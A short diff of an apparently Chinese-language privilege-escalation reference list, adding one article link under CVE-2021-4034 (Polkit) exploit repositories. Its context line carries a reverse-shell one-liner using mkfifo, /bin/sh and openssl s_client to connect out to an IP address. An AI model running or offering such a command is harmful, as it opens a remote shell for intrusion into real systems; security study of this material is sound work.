@@ -41,6 +41,7 @@ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 1.117
 > Linux Polkit 权限提升漏洞
 [CVE-2021-4034](https://github.com/zhzyker/CVE-2021-4034)
 - https://github.com/berdav/CVE-2021-4034
+- https://xz.aliyun.com/t/10870
 
 - Redhat/CentOS 发行版下通过写恶意网卡配置文件进行命令执行的方式
     - https://seclists.org/fulldisclosure/2019/Apr/24
